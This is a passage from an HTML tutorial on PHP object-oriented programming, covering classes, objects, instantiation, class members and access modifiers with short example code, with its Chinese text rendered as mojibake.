€ï¼šå¼€å‘è€…ä½¿ç”¨ç®€æ´<code>è‹±æ–‡å­—æ¯</code>å’Œ<code>ç¬¦å·</code>ç»„æˆï¼Œè®©è®¡ç®—æœºè¯»å–åæ ¹æ®ç¬¦å·è¿›è¡ŒåŠ å·¥æ‰§è¡Œ</p><ul><li>ä¼˜ç‚¹ï¼šæŒ‡ä»¤ç®€å•æ˜äº†ã€æ¨å¹¿æ€§é«˜</li><li>ç¼ºç‚¹ï¼šç§»æ¤æ€§å·®ã€åŠŸèƒ½ç®€å•</li></ul></li><li><p>é«˜çº§è®¡ç®—æœºè¯­è¨€ï¼šå¼€å‘è€…ä½¿ç”¨ç±»ä¼¼è‡ªç„¶è¯­è¨€çš„<code>ç¬¦å·</code>ç»„æˆï¼Œé«˜çº§è¯­è¨€æ ¹æ®ç¼–ç¨‹æ€æƒ³åˆ†ä¸º<code>é¢å‘è¿‡ç¨‹ç¼–ç¨‹</code>å’Œ<code>é¢å‘å¯¹è±¡ç¼–ç¨‹</code>ä¸¤ç§ï¼Œç„¶åç³»ç»Ÿå¯¹ç¨‹åºä»£ç è¿›è¡Œç¼–è¯‘ï¼ˆéœ€è¦ç¬¬ä¸‰æ–¹ç¼–è¯‘å™¨ï¼‰ç„¶åæ‰§è¡Œ</p><ul><li>ä¼˜ç‚¹ï¼šç§»æ¤æ€§å¼ºã€å¯è¯»æ€§å¼ºã€æ¨å¹¿æ€§éå¸¸é«˜</li><li>ç¼ºç‚¹ï¼šæ‰§è¡Œæ•ˆç‡é™ä½</li></ul></li></ul><p><strong>é¢å‘è¿‡ç¨‹ç¼–ç¨‹</strong></p><ul><li><p>å°†è¦è§£å†³çš„é—®é¢˜ï¼ˆåŠŸèƒ½éœ€æ±‚ï¼‰åˆ†è§£æˆå…·ä½“çš„æ­¥éª¤ï¼Œç„¶åé€šè¿‡<strong>å‡½æ•°ç¼–ç¨‹</strong>å®ç°æ¯ä¸€ä¸ªæ­¥éª¤ï¼Œæœ€åé€šè¿‡å‡½æ•°è§„å®šå¥½çš„é¡ºåºè°ƒç”¨å®Œæˆ</p></li><li><p>é¢å‘è¿‡ç¨‹ç¼–ç¨‹æ€æƒ³çš„ä¼˜ç‚¹</p><ul><li>èƒ½å¤Ÿé’ˆå¯¹æ­¥éª¤æ‹†åˆ†ï¼Œè¿›è¡Œæ¨¡å—åŒ–å°è£…ï¼ˆå‡½æ•°ï¼‰</li><li>å¯ä»¥å®ç°ä»£ç å¤ç”¨ï¼Œä»è€ŒèŠ‚çœå¼€å‘æˆæœ¬</li></ul></li><li><p>é¢å‘è¿‡ç¨‹ç¼–ç¨‹æ€æƒ³çš„ç¼ºç‚¹</p><ul><li>ä¸å¤Ÿçµæ´»ç»´æŠ¤ï¼Œæµç¨‹ä¸€æ—¦ç¡®å®šå°±å¿…é¡»æŒ‰ç…§æ—¢å®šæ–¹å¼æ‰§è¡Œåˆ°åº•ã€‚</li></ul></li></ul><blockquote><p><strong>å°ç»“</strong></p></blockquote><p>1ã€è®¡ç®—æœºç¼–ç¨‹ä»å¯¹å¼€å‘äººå‘˜è¦æ±‚æé«˜åˆ°è¦æ±‚ä¸é«˜ï¼Œæ˜¯ä¸€ä»£ä»£äººåšæŒä¸æ‡ˆçš„ç»“æœ</p><p>2ã€é¢å‘å¯¹è±¡ç¼–ç¨‹æ˜¯ç›®å‰æœ€ä¸ºç¬¦åˆäººç±»æ€ç»´é€»è¾‘çš„ä¸€ç§ç¼–ç¨‹æ€æƒ³</p><h2 id="ä¸€ã€é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³"><a href="#ä¸€ã€é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³" class="headerlink" title="ä¸€ã€é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³"></a>ä¸€ã€é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³</h2><blockquote><p>ç›®æ ‡ï¼šç†è§£é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³ä¸é¢å‘è¿‡ç¨‹ç¼–ç¨‹æ€æƒ³çš„åŒºåˆ«ï¼Œäº†è§£é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³çš„æ ¸å¿ƒï¼Œå»ºç«‹é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³</strong>ï¼šé¢å‘å¯¹è±¡ç¼–ç¨‹ä¹Ÿå«åšOOPç¼–ç¨‹ï¼ˆObjected Oriented Programmingï¼‰ï¼Œæ˜¯ä¸€ç§åŸºäºé¢å‘è¿‡ç¨‹çš„å¼€å‘æ€æƒ³ã€‚ä¸é¢å‘è¿‡ç¨‹å¼ºè°ƒåˆ†è§£äº‹åŠ¡æ­¥éª¤ç›¸ä¼¼ï¼Œé¢å‘å¯¹è±¡æ›´éœ€è¦è¿½æ±‚äº‹åŠ¡æ“ä½œçš„â€œä¸»ä½“â€ï¼Œä¹Ÿå°±æ˜¯<code>å¯¹è±¡</code></p><ul><li><p>é¢å‘å¯¹è±¡ç¼–ç¨‹æ˜¯ä¸€ç§ç¼–ç¨‹æ€æƒ³ï¼Œä¸æ˜¯ä¸€ç§å…·ä½“æŠ€æœ¯</p></li><li><p>é¢å‘å¯¹è±¡æ˜¯åœ¨é¢å‘è¿‡ç¨‹åŸºç¡€ä¹‹ä¸Šå‘å±•è€Œæ¥ï¼Œå› æ­¤ä¹Ÿæ˜¯ä¸€ç§æ¨¡å—åŒ–ç¼–ç¨‹æ€æƒ³ï¼ˆæœ‰å‡½æ•°ï¼‰</p></li><li><p>é¢å‘å¯¹è±¡èƒ½å¤Ÿæ›´åŠ æ–¹ä¾¿çš„å®ç°ä»£ç çš„é‡å¤åˆ©ç”¨ï¼ˆé€‚ç”¨äºå¤§å‹é¡¹ç›®ï¼‰</p></li><li><p>åœ¨é¢å‘å¯¹è±¡æ€ç»´ä¸­ï¼Œä»»ä½•åŠ¨ä½œçš„æ‰§è¡Œæˆ–è€…æ•°æ®éƒ½å±äºå¯¹è±¡ï¼ˆä¸€åˆ‡çš†å¯¹è±¡ï¼‰</p></li></ul><blockquote><p>åŸç†</p></blockquote><p>1ã€é¢å‘è¿‡ç¨‹ç¼–ç¨‹æ€æƒ³åŸç†<br>2ã€é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³åŸç†</p><blockquote><p><strong>å°ç»“</strong></p></blockquote><ol><li>é¢å‘å¯¹è±¡ç¼–ç¨‹æ˜¯ä¸€ç§ç¼–ç¨‹æ€æƒ³ï¼Œä¸æŠ€æœ¯æ— å…³</li><li>é¢å‘å¯¹è±¡ç¼–ç¨‹çš„æœ¬è´¨æ˜¯å¢åŠ æ•°æ®å’ŒåŠŸèƒ½çš„æ“ä½œä¸»ä½“ï¼Œå³å¯¹è±¡</li><li>é¢å‘å¯¹è±¡ä¸­æ‰€æœ‰çš„æ•°æ®å’ŒåŠŸèƒ½éƒ½æ˜¯ç”±ä¸»ä½“ï¼ˆå¯¹è±¡ï¼‰æ¥è°ƒç”¨å’Œæ“ä½œ</li></ol><h2 id="äºŒã€é¢å‘å¯¹è±¡åŸºç¡€"><a href="#äºŒã€é¢å‘å¯¹è±¡åŸºç¡€" class="headerlink" title="äºŒã€é¢å‘å¯¹è±¡åŸºç¡€"></a><strong>äºŒã€é¢å‘å¯¹è±¡åŸºç¡€</strong></h2><blockquote><p>å­¦ä¹ ç›®æ ‡ï¼šæŒæ¡é¢å‘å¯¹è±¡çš„åŸºç¡€è¯­æ³•ï¼Œèƒ½å¤Ÿä½¿ç”¨é¢å‘å¯¹è±¡æ€æƒ³å’Œè¯­æ³•æ¥è§£å†³éœ€æ±‚é—®é¢˜</p></blockquote><ul><li>é¢å‘å¯¹è±¡å…³é”®å­—</li><li>ç±»çš„å®šä¹‰ã€å®ä¾‹åŒ–å’Œå¯¹è±¡</li><li>ç±»æˆå‘˜</li><li>è®¿é—®ä¿®é¥°é™å®šç¬¦</li><li>å†…éƒ¨å¯¹è±¡$this</li><li>é¢å‘å¯¹è±¡å¼€å‘è§„èŒƒ</li><li>é­”æœ¯æ–¹æ³•</li><li>æˆå‘˜è®¿é—®</li><li>é™æ€æˆå‘˜</li><li>è‡ªåŠ¨åŠ è½½</li><li>å…‹éš†</li><li>ç»¼åˆè¿ç”¨</li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€é¢å‘è¿‡ç¨‹çš„æ–¹å¼å®ç°ä¸€ä¸ªåŠŸèƒ½ï¼šè´­ä¹°å•†å“</p><pre><code># å®šä¹‰å‡½æ•°è´­ä¹°å•†å“function buy($goods_id,$num = 1){    echo &apos;å•†å“ï¼š&apos; . $goods_id . &apos;è´­ä¹°ï¼š&apos; . $num . &apos;ä¸ªï¼&apos;;    return ;}# è°ƒç”¨è§£å†³buy(1,10);    # è¾“å‡ºï¼š å•†å“ï¼š1è´­ä¹°10ä¸ª</code></pre><p>2ã€é¢å‘å¯¹è±¡çš„æ–¹å¼å®ç°ä¸€ä¸ªåŠŸèƒ½ï¼šè´­ä¹°å•†å“</p><pre><code># ç¡®å®šæ˜¯æ¶ˆè´¹è€…è´­ä¹°ï¼ˆç±»ï¼‰class Buyer{    # æ‹¥æœ‰è´­ä¹°åŠŸèƒ½ï¼ˆæ–¹æ³•ï¼‰    function buy($id,$num = 1){        echo &apos;å•†å“ï¼š&apos; . $goods_id . &apos;è´­ä¹°ï¼š&apos; . $num . &apos;ä¸ªï¼&apos;;        return ;    }}# ç¡®å®šå…·ä½“ä¹°å®¶è´­ä¹°$b = new Buyer();    # äº§ç”Ÿå…·ä½“ä¹°å®¶ï¼ˆå¯¹è±¡ï¼‰$b-&gt;buy(1,10);        # è¾“å‡ºï¼š å•†å“ï¼š1è´­ä¹°10ä¸ª</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€é¢å‘å¯¹è±¡æ˜¯ä¸€ç§ç¼–ç¨‹æ€æƒ³ï¼Œç¼–ç¨‹è¯­è¨€è¦å®ç°è¿™ç§ç¼–ç¨‹æ€æƒ³å°±ä¼šæœ‰ä¸€äº›ç›¸åº”çš„è¯­æ³•æ ¼å¼å‡ºç°</p><p>2ã€ä½¿ç”¨é¢å‘å¯¹è±¡è¯­æ³•æ ¼å¼å®ç°çš„åŠŸèƒ½æ‰å±äºé¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰</p><h3 id="1ã€é¢å‘å¯¹è±¡å…³é”®å­—è¯´æ˜"><a href="#1ã€é¢å‘å¯¹è±¡å…³é”®å­—è¯´æ˜" class="headerlink" title="1ã€é¢å‘å¯¹è±¡å…³é”®å­—è¯´æ˜"></a><strong>1ã€é¢å‘å¯¹è±¡å…³é”®å­—è¯´æ˜</strong></h3><blockquote><p>ç›®æ ‡ï¼šäº†è§£é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ä¸€äº›å…³é”®å­—çš„æ„ä¹‰</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>é¢å‘å¯¹è±¡å…³é”®å­—</strong>ï¼šåŸºäºé¢å‘å¯¹è±¡å¼€å‘æ—¶ï¼Œæ‰€ç”¨åˆ°çš„ä¸€äº›å…³é”®å­—ï¼Œç”¨æ¥è¡¨æ˜ä¸åŒçš„ç»“æ„æˆ–è€…ç±»å‹</p><ul><li><p>ç±»ï¼šclassï¼Œæ˜¯å®šä¹‰é¢å‘å¯¹è±¡ä¸»ä½“çš„æœ€å¤–å±‚ç»“æ„ï¼Œç”¨æ¥åŒ…è£¹ä¸»ä½“çš„æ•°æ®å’ŒåŠŸèƒ½ï¼ˆå‡½æ•°ï¼‰ã€‚ç±»æ˜¯ä¸€ç±»å…·æœ‰å…±æ€§äº‹åŠ¡çš„ä»£è¡¨ï¼Œä»£è¡¨çš„æ˜¯äº‹åŠ¡çš„å…±æ€§ã€‚</p></li><li><p>å¯¹è±¡ï¼šobjectï¼Œæ˜¯æŸç±»äº‹åŠ¡çš„å…·ä½“ä»£è¡¨ï¼Œä¹Ÿæ˜¯å®é™…æ•°æ®å’ŒåŠŸèƒ½æ“ä½œçš„å…·ä½“å•å…ƒï¼Œä¹Ÿè¢«ç§°ä¹‹ä¸ºå®ä¾‹ï¼ˆinstanceï¼‰</p></li><li><p>å®ä¾‹åŒ–ï¼šnewï¼Œä»ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µå¾—åˆ°ä¸€ä¸ªç¬¦åˆæŠ½è±¡æ¦‚å¿µçš„å…·ä½“å®ä¾‹çš„è¿‡ç¨‹</p></li><li><p>ç±»æˆå‘˜ï¼šmemberï¼ŒæŒ‡ç±»classç»“æ„ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Œç±»æˆå‘˜é‡Œæœ‰ä¸‰ç§</p><ul><li>æ–¹æ³•ï¼šmethodï¼Œæœ¬è´¨æ˜¯åœ¨ç±»classç»“æ„ä¸­åˆ›å»ºçš„å‡½æ•°ï¼Œä¹Ÿç§°ä¹‹ä¸º<code>æˆå‘˜æ–¹æ³•</code>æˆ–è€…æˆå‘˜å‡½æ•°</li><li>å±æ€§ï¼špropertyï¼Œæœ¬è´¨æ˜¯åœ¨ç±»classç»“æ„ä¸­åˆ›å»ºçš„å˜é‡ï¼Œä¹Ÿç§°ä¹‹ä¸º<code>æˆå‘˜å˜é‡</code></li><li>ç±»å¸¸é‡ï¼šconstï¼Œæœ¬è´¨æ˜¯åœ¨ç±»classç»“æ„ä¸­åˆ›å»ºçš„å¸¸é‡</li></ul></li></ul><blockquote><p>å°ç»“</p></blockquote><p>1ã€å› ä¸ºé¢å‘å¯¹è±¡æ€æƒ³çš„å‡ºç°ï¼Œä¼šå¤šå‡ºä¸€äº›ç»“æ„è¯­æ³•å…³é”®å­—</p><p>2ã€äº†è§£å…³é”®å­—çš„ä½œç”¨åï¼Œæ‰èƒ½æ›´çµæ´»çš„åº”ç”¨å…³é”®å­—å®ç°é¢å‘å¯¹è±¡ç¼–ç¨‹</p><h3 id="2ã€é¢å‘å¯¹è±¡ç®€å•æŠ€æœ¯å®ç°"><a href="#2ã€é¢å‘å¯¹è±¡ç®€å•æŠ€æœ¯å®ç°" class="headerlink" title="2ã€é¢å‘å¯¹è±¡ç®€å•æŠ€æœ¯å®ç°"></a><strong>2ã€é¢å‘å¯¹è±¡ç®€å•æŠ€æœ¯å®ç°</strong></h3><blockquote><p>ç›®æ ‡ï¼šæŒæ¡ç±»ã€å¯¹è±¡å’Œå®ä¾‹åŒ–ä¹‹é—´çš„å…³ç³»</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>ç±»</strong>ï¼šæ ¹æ®å¯¹è±¡åˆ†æåå¾—åˆ°çš„ä¸€ç§é€šç”¨ç»“æ„ï¼ˆåˆ†ç±»ï¼‰</p><ul><li>classå…³é”®å­—å£°æ˜ç±»</li><li>ç±»åï¼šè‡ªå®šä¹‰åå­—ï¼Œé€šå¸¸é¦–å­—æ¯å¤§å†™ï¼Œä¸€èˆ¬å¤šå•è¯ç»„æˆç±»ä½¿ç”¨é©¼å³°æ³•ï¼ˆå¤§é©¼å³°æ³•ï¼‰</li><li><p>å¤§æ‹¬å·ï¼šç±»å†…éƒ¨çš„ç»“æ„ï¼ˆmemberï¼Œç±»æˆå‘˜ï¼‰</p><p>class ç±»å{</p><p>}</p></li><li><p>å®ä¾‹åŒ–ï¼šç±»äº§ç”Ÿå¯¹è±¡çš„è¿‡ç¨‹</p><p>new ç±»å;<br>new ç±»å();    # ä½¿ç”¨è¾ƒå¤š</p></li><li><p>å¯¹è±¡ï¼šæ ¹æ®ç±»äº§ç”Ÿçš„æŸä¸ªå…·ä½“å­˜åœ¨çš„å®ä½“ï¼ˆinstanceï¼‰ï¼Œå¯¹è±¡ä¸€èˆ¬ä½¿ç”¨å˜é‡ä¿å­˜</p><p>$object = new ç±»å();</p></li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€æ ¹æ®éœ€æ±‚äº§ç”Ÿç±»ç»“æ„ï¼ˆclassï¼‰</p><ul><li>åˆ†æç±»æ‹¥æœ‰çš„æ•°æ®</li><li>åˆ†æç±»çš„è¡Œä¸º</li></ul><p>2ã€åœ¨éœ€è¦ä½¿ç”¨å¯¹è±¡çš„åœ°æ–¹ï¼Œå¯¹ç±»è¿›è¡Œå®ä¾‹åŒ–ï¼ˆnewï¼‰ï¼Œå¹¶ä¿å­˜å¯¹è±¡</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€å®šä¹‰ç±»åŸºæœ¬è¯­æ³•ï¼šclass ç±»å{}</p><pre><code># å®šä¹‰ä¸€ä¸ªç©ºç±»class Nothing{}</code></pre><p>2ã€ç±»å®ä¾‹åŒ–äº§ç”Ÿå¯¹è±¡ï¼šnew</p><pre><code># å®ä¾‹åŒ–ï¼Œå¹¶å°†äº§ç”Ÿçš„å¯¹è±¡ä¿å­˜åœ¨å˜é‡ä¸­$n = new Nothing();# æ‰“å°å¯¹è±¡var_dump($n);# æ‰“å°ç»“æœåˆ†æobject(Nothing)#1 (0) { } objectï¼šå¯¹è±¡(Nothing)ï¼šæ‰€å±ç±»å #1ï¼šå¯¹è±¡ç¼–å·ï¼Œä¸ç±»æ— å…³ï¼Œæ˜¯æ•´ä¸ªè„šæœ¬ä¸­å¯¹è±¡çš„åºå·ï¼Œä»1å¼€å§‹(0)ï¼šæˆå‘˜å˜é‡ï¼ˆå±æ€§ï¼‰ä¸ªæ•°   {}ï¼šå…·ä½“æˆå‘˜å˜é‡ä¿¡æ¯ï¼ˆé”®å€¼å¯¹ï¼‰</code></pre><p>3ã€ç±»classæ˜¯ä¸€ç§ç»“æ„ï¼Œå¦‚æœå†™å¥½æ²¡æœ‰è¯­æ³•é”™è¯¯çš„æƒ…å†µä¸‹ï¼Œä»£ç ä¸ä¼šæ‰§è¡Œï¼ˆä¸å‡½æ•°å®šä¹‰ä¸€æ ·ï¼‰ï¼Œä¹Ÿæ— æ³•æ‰“å°è¾“å‡º</p><pre><code># ç›´æ¥æ‰“å°ç±»åvar_dump(Nothing);        # é”™è¯¯ï¼Œæç¤ºæœªå®šä¹‰çš„å¸¸é‡</code></pre><p>4ã€ç±»çš„å‘½åè§„èŒƒï¼šç±»çš„å‘½åè§„èŒƒä¸å‡½æ•°ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºäººä¸ºçš„é€šå¸¸ä¼šå°†ç±»åçš„é¦–å­—æ¯å¤§å†™</p><pre><code># æœ‰æ•ˆç±»åclass My1{}class My_1{}class _My1{}# æ— æ•ˆç±»åclass 1My{}class 1_my{}</code></pre><p>5ã€å¦‚æœç¢°åˆ°å¤šå•è¯ç»„æˆçš„ç±»åï¼Œé€šå¸¸ä½¿ç”¨é©¼å³°æ³•</p><pre><code>class MyClass{}</code></pre><blockquote><p><strong>å°ç»“</strong></p></blockquote><ol><li>é€šè¿‡classå…³é”®å­— + ç±»å +{}åˆ›å»ºç±»</li><li>ç±»æ˜¯ä¸€ç§ç»“æ„ï¼Œä¸ä¼šè‡ªåŠ¨è¿è¡Œï¼Œä¹Ÿä¸èƒ½è¾“å‡º</li><li>é€šè¿‡new ç±»åå®ä¾‹åŒ–å¯¹è±¡å¾—åˆ°ç±»çš„å…·ä½“å¯¹è±¡</li><li>å¯ä»¥é€šè¿‡newå®ä¾‹åŒ–æ— é™ä¸ªå¯¹è±¡</li></ol><h3 id="3ã€ç±»æˆå‘˜"><a href="#3ã€ç±»æˆå‘˜" class="headerlink" title="3ã€ç±»æˆå‘˜"></a><strong>3ã€ç±»æˆå‘˜</strong></h3><blockquote><p>ç›®æ ‡ï¼šäº†è§£ç±»æˆå‘˜çš„ç±»å‹ï¼Œç±»æˆå‘˜çš„ä½œç”¨ï¼Œèƒ½å¤Ÿè¿ç”¨ç±»æˆå‘˜å»åˆ›å»ºæœ‰æ•ˆç±»</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>ç±»æˆå‘˜</strong>ï¼šæŒ‡<strong>ç›´æ¥å®šä¹‰</strong>åœ¨ç±»ç»“æ„{}å†…éƒ¨çš„ä¸€çº§æˆå‘˜ï¼Œå³ç›´æ¥ä¾èµ–{}çš„æˆå‘˜</p><ul><li>ç±»æˆå‘˜åˆ†ç±»<ul><li>æˆå‘˜å˜é‡ï¼ˆå±æ€§ï¼‰ï¼šç»™å¯¹è±¡å­˜å‚¨æ•°æ®çš„å˜é‡</li><li>æˆå‘˜å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰ï¼šç»™å¯¹è±¡è°ƒç”¨è§£å†³é—®é¢˜çš„å‡½æ•°</li><li>ç±»å¸¸é‡ï¼šå±äºç±»å†…éƒ¨çš„å¸¸é‡ï¼Œä½¿ç”¨constå…³é”®å­—å®šä¹‰</li></ul></li><li><p>å±æ€§å’Œæ–¹æ³•éœ€è¦ä½¿ç”¨<strong>è®¿é—®ä¿®é¥°é™å®šç¬¦ä¿®é¥°</strong>ï¼Œå§‘ä¸”ä½¿ç”¨publicä¿®é¥°</p><p>class ç±»å{</p><pre><code># ç±»å¸¸é‡ï¼ˆå¯ä»¥å¤šä¸ªï¼‰const å¸¸é‡å = å€¼;# å±æ€§ï¼ˆå¯ä»¥å¤šä¸ªï¼‰public $å±æ€§å [ = å€¼];    # å¯ä»¥èµ‹å€¼ä¹Ÿå¯ä»¥ä¸èµ‹å€¼ï¼Œåªå£°æ˜# æ–¹æ³•ï¼ˆå¯ä»¥å¤šä¸ªï¼‰[public] function æ–¹æ³•å([å½¢å‚åˆ—è¡¨]){    # æ–¹æ³•ä½“ï¼ˆè¿”å›å€¼ï¼‰}</code></pre><p>}</p></li><li><p>æˆå‘˜è®¿é—®ï¼šå±æ€§å’Œæ–¹æ³•éƒ½å±äºå¯¹è±¡è®¿é—®ï¼Œç±»å¸¸é‡å±äºç±»è®¿é—®ï¼ˆåç»­å†è®²ï¼‰</p><ul><li>å¯¹è±¡è®¿é—®å±æ€§å’Œæ–¹æ³•ï¼Œä½¿ç”¨<code>-&gt;</code></li></ul><h1 id="å®ä¾‹åŒ–"><a href="#å®ä¾‹åŒ–" class="headerlink" title="å®ä¾‹åŒ–"></a>å®ä¾‹åŒ–</h1><p>$object = new ç±»å();</p><h1 id="å±æ€§è®¿é—®"><a href="#å±æ€§è®¿é—®" class="headerlink" title="å±æ€§è®¿é—®"></a>å±æ€§è®¿é—®</h1><p>$object-&gt;å±æ€§å;        # æ­¤æ—¶ä¸å¸¦å±æ€§æœ¬èº«çš„$ç¬¦å·ï¼ˆå‰é¢ä¿å­˜å¯¹è±¡çš„å˜é‡å¸¦$ç¬¦å·ï¼Œobject-&gt;å±æ€§åæ˜¯æ•´ä½“ï¼‰</p><h1 id="æ–¹æ³•è®¿é—®"><a href="#æ–¹æ³•è®¿é—®" class="headerlink" title="æ–¹æ³•è®¿é—®"></a>æ–¹æ³•è®¿é—®</h1><p>$object-&gt;æ–¹æ³•å([å®å‚åˆ—è¡¨]);</p></li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€å£°æ˜ç±»ç»“æ„</p><p>2ã€æ˜ç¡®ç±»äº§ç”Ÿçš„å¯¹è±¡æ˜¯å¦éœ€è¦æœ‰æ•°æ®çš„å­˜å‚¨ï¼šç¡®å®šå±æ€§</p><p>3ã€æ˜ç¡®ç±»äº§ç”Ÿçš„å¯¹è±¡æ˜¯å¦éœ€è¦å‡½æ•°å®ç°åŠŸèƒ½ï¼šç¡®å®šæ–¹æ³•</p><p>4ã€æ˜ç¡®ç±»æ˜¯å¦éœ€è¦å®šä¹‰å¸¸é‡ï¼šç¡®å®šç±»å¸¸é‡</p><p>5ã€å¯¹è±¡å®ä¾‹åŒ–</p><p>6ã€ç±»æˆå‘˜è®¿é—®ï¼ˆå±æ€§å’Œæ–¹æ³•ï¼‰</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€å£°æ˜ç±»ç»“æ„</p><pre><code># å®šä¹‰ä¹°å®¶ç±»ï¼šä¹°å®¶æœ‰å§“åï¼Œæœ‰é’±class Buyer{    # å±æ€§å£°æ˜    $name;                # é”™è¯¯ï¼Œç±»å†…éƒ¨å±æ€§å¿…é¡»ä½¿ç”¨è®¿é—®ä¿®é¥°é™å®šç¬¦    public $name;        # æ­£ç¡®ï¼šæ²¡æœ‰èµ‹å€¼    public $money = 0;    # æ­£ç¡®ï¼šæœ‰èµ‹å€¼    # æ–¹æ³•å£°æ˜    function display(){        echo __CLASS__;    # é­”æœ¯å¸¸é‡ï¼Œè¾“å‡ºç±»å    }    # ç±»å¸¸é‡å£°æ˜    const BIG_NAME = &apos;BUYER&apos;;}</code></pre><p>2ã€æˆå‘˜å˜é‡è®¿é—®ï¼ˆå±æ€§å’Œæ–¹æ³•ï¼‰ï¼šæˆå‘˜å¿…é¡»é€šè¿‡å¯¹è±¡æ‰èƒ½è¿›è¡Œè®¿é—®ï¼Œéœ€è¦å…ˆé€šè¿‡å®ä¾‹åŒ–å¾—åˆ°å¯¹è±¡ï¼Œç„¶åé€šè¿‡å¯¹è±¡å®ç°å¯¹æˆå‘˜è¿›è¡Œæ“ä½œ</p><pre><code># å®ä¾‹åŒ–å¯¹è±¡$b = new Buyer();# è®¿é—®å±æ€§echo $b-&gt;money;# ä¿®æ”¹å±æ€§$b-&gt;money = 1000;# åˆ é™¤å±æ€§unset($b-&gt;name);# æ–°å¢å±æ€§$b-&gt;age = 20;# è®¿é—®æ–¹æ³•$b-&gt;display();</code></pre><p><strong>æ³¨æ„</strong></p><ul><li><p>åˆ é™¤å±æ€§å’Œæ–°å¢å±æ€§é€šå¸¸ä½¿ç”¨è¾ƒå°‘ï¼Œæ›´å¤šçš„å±æ€§æ“ä½œæ˜¯è®¿é—®å’Œä¿®æ”¹</p></li><li><p>ç±»å¸¸é‡ä¸æ˜¯ç”±å¯¹è±¡æ¥è¿›è¡Œè®¿é—®ï¼Œæ‰€ä»¥æš‚æ—¶ä¸åšè®¿é—®è®²è§£ï¼Œåˆ°åé¢çŸ¥è¯†å†è®²</p></li><li><p>å±æ€§å’Œæ–¹æ³•çš„ä½¿ç”¨éƒ½å¿…é¡»ç¡®ä¿ç±»ä¸­å·²ç»å®šä¹‰ï¼ˆå±æ€§å¯ä»¥æ–°å¢ï¼‰</p></li></ul><p>3ã€ç±»æˆå‘˜ä¸­ï¼šå±æ€§ã€ç±»å¸¸é‡å’Œæ–¹æ³•éƒ½å¯ä»¥æ— é™å®šä¹‰ï¼Œä½†æ˜¯å®šä¹‰çš„åŸåˆ™æ˜¯ç›¸å…³æ€§ã€‚é™¤äº†ä»¥ä¸Šä¸‰ä¸ªç±»æˆå‘˜ï¼Œä¸èƒ½åœ¨ç±»ç»“æ„{}ä¸­ç›´æ¥å†™å…¶ä»–ä»»ä½•ä»£ç </p><pre><code>class Buyer{    echo __CLASS__;                    # é”™è¯¯    define(&apos;PI&apos;,3.14);                 # é”™è¯¯    if(true){ echo &apos;hello world&apos;}    # é”™è¯¯}    </code></pre><blockquote><p><strong>å°ç»“</strong></p></blockquote><p>1ã€PHPç±»ç»“æ„ä¸­æœ‰ä¸”ä»…æœ‰ä¸‰ç§æˆå‘˜ï¼šå±æ€§ã€æ–¹æ³•å’Œç±»å¸¸é‡ï¼Œå…¶ä»–ç›´æ¥å±äºç±»çš„å†…å®¹éƒ½ä¼šæŠ¥é”™</p><p>2ã€ç±»å£°æ˜éœ€è¦æ ¹æ®ä¸šåŠ¡æ¥ç¡®å®šç±»æˆå‘˜çš„å­˜åœ¨å’Œæ•°é‡</p><p>3ã€ç±»ä¸­å±æ€§å’Œæ–¹æ³•çš„è®¿é—®æ–¹å¼éƒ½æ˜¯é€šè¿‡å¯¹è±¡æ¥è°ƒç”¨ï¼š$å¯¹è±¡-&gt;å±æ€§å/æ–¹æ³•å()ï¼›æ³¨æ„å±æ€§åä¸å¸¦$ç¬¦å·</p><p>4ã€ç±»ä¸­å®šä¹‰å±æ€§ä¸èƒ½ç›´æ¥å±æ€§åï¼Œéœ€è¦ä½¿ç”¨ç¬¦å·publicä¿®é¥°ï¼ˆè®¿é—®ä¿®é¥°é™å®šç¬¦ä¸­çš„ä¸€ç§ï¼‰</p><h3 id="4ã€è®¿é—®ä¿®é¥°é™å®šç¬¦"><a href="#4ã€è®¿é—®ä¿®é¥°é™å®šç¬¦" class="headerlink" title="4ã€è®¿é—®ä¿®é¥°é™å®šç¬¦"></a><strong>4ã€è®¿é—®ä¿®é¥°é™å®šç¬¦</strong></h3><blockquote><p>ç›®æ ‡ï¼šç†è§£è®¿é—®ä¿®é¥°é™å®šç¬¦çš„ä½œç”¨ï¼ŒæŒæ¡è®¿é—®ä¿®é¥°é™å®šç¬¦çš„å®é™…è¿ç”¨</p></blockquote><blockquote><p><strong>æ¦‚å¿µ</strong></p></blockquote><p><strong>è®¿é—®ä¿®é¥°é™å®šç¬¦</strong>ï¼šç”¨åœ¨å±æ€§æˆ–è€…æ–¹æ³•å‰çš„ä¿®é¥°å…³é”®å­—ï¼Œæ˜¯ç”¨æ¥æ§åˆ¶å±æ€§æˆ–è€…æ–¹æ³•çš„è®¿é—®ä½ç½®</p><ul><li>è®¿é—®ä¿®é¥°é™å®šç¬¦åˆ†ç±»<ul><li>publicï¼šå…¬æœ‰ï¼Œç±»å†…å’Œç±»å¤–éƒ½å¯ä»¥è®¿é—®</li><li>protectedï¼šå—ä¿æŠ¤ï¼Œåªå…è®¸åœ¨ç›¸å…³ç±»å†…éƒ¨è®¿é—®</li><li>privateï¼šç§æœ‰ï¼Œåªå…è®¸åœ¨å®š